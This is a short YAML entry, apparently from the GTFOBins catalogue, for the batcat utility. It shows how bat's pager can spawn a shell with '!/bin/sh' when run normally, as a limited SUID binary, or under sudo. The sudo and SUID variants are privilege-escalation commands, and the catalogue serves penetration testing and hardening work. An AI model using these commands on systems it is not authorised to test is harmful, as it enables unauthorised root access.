---
description: This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply. `--paging always` can be omitted provided that the output doesn't fit the screen.
functions:
  shell:
    - code: |
        batcat --paging always /etc/profile
        !/bin/sh
  limited-suid:
    - code: |
        ./batcat --paging always /etc/profile
        !/bin/sh
  sudo:
    - code: |
        sudo batcat --paging always /etc/profile
        !/bin/sh
---
